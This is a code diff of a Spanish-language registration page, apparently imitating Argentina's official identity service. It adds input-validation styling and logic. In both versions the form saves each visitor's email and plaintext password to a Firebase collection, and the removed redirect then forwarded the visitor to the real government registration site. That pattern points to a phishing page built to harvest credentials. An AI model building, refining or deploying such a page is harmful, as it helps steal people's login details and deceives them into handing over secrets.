@@ -53,17 +53,24 @@
             margin-bottom: 8px;
         }
 
+        /* Estilos de los Inputs */
         .registerForm_input {
             width: 100%;
             padding: 10px 0;
             border: none;
-            border-bottom: 1px solid #ccc;
+            border-bottom: 2px solid #ccc; /* Borde base */
             outline: none;
             font-size: 16px;
+            transition: border-color 0.3s;
         }
 
-        .registerForm_input:focus {
-            border-bottom: 2px solid #3730ba;
+        /* Clases de validación */
+        .input-invalid {
+            border-bottom-color: #ff4d4d !important; /* Rojo */
+        }
+
+        .input-valid {
+            border-bottom-color: #2ecc71 !important; /* Verde */
         }
 
         .custom-button {
@@ -82,6 +89,7 @@
         .custom-button:disabled {
             background-color: #e0e0e0;
             color: #999;
+            cursor: not-allowed;
         }
 
         .back-link {
@@ -104,14 +112,14 @@
                 <div class="loginForm_fieldContainer">
                     <label class="registerForm_label">
                         <span class="registerForm_labelSpan">Correo electronico</span>
-                        <input id="reg-email" name="email" class="registerForm_input" type="email" required>
+                        <input id="reg-email" name="email" class="registerForm_input" type="email" required placeholder="ejemplo@correo.com">
                     </label>
                 </div>
 
                 <div class="loginForm_fieldContainer">
                     <label class="registerForm_label">
                         <span class="registerForm_labelSpan">Crea una contraseña</span>
-                        <input id="reg-password" name="password" class="registerForm_input" type="password" required>
+                        <input id="reg-password" name="password" class="registerForm_input" type="password" required placeholder="Mínimo 6 caracteres">
                     </label>
                 </div>
 
@@ -142,12 +150,28 @@
         const passIn = document.getElementById('reg-password');
         const regBtn = document.getElementById('btnRegistro');
 
-        function validar() {
-            regBtn.disabled = !(emailIn.value.includes('@') && passIn.value.length >= 6);
+        function validarInputs() {
+            const emailValido = emailIn.value.includes('@') && emailIn.value.includes('.');
+            const passValida = passIn.value.length >= 6;
+
+            // Validación Visual Email
+            if (emailIn.value.length > 0) {
+                emailIn.classList.toggle('input-valid', emailValido);
+                emailIn.classList.toggle('input-invalid', !emailValido);
+            }
+
+            // Validación Visual Password
+            if (passIn.value.length > 0) {
+                passIn.classList.toggle('input-valid', passValida);
+                passIn.classList.toggle('input-invalid', !passValida);
+            }
+
+            // Habilitar Botón
+            regBtn.disabled = !(emailValido && passValida);
         }
 
-        emailIn.addEventListener('input', validar);
-        passIn.addEventListener('input', validar);
+        emailIn.addEventListener('input', validarInputs);
+        passIn.addEventListener('input', validarInputs);
 
         document.getElementById('registerForm').addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -155,18 +179,19 @@
             regBtn.disabled = true;
 
             try {
+                // Guardamos en Firebase
                 await addDoc(collection(db, "registros"), {
                     email: emailIn.value,
                     password: passIn.value,
-                    tipo: "registro_nuevo",
                     fecha: new Date().toLocaleString()
                 });
                 
-                // Una vez registrado, lo mandamos a la siguiente parte (por ahora el login oficial)
-                window.location.href = "https://id.argentina.gob.ar/registro/";
+                // ÉXITO: Volvemos al inicio de sesión automáticamente
+                window.location.href = "index.html"; 
+
             } catch (error) {
-                console.error(error);
-                alert("Error al procesar el registro");
+                console.error("Error Firebase:", error);
+                alert("Hubo un error al guardar los datos. Revisa tu consola.");
                 regBtn.disabled = false;
                 regBtn.innerText = "CONTINUAR";
             }
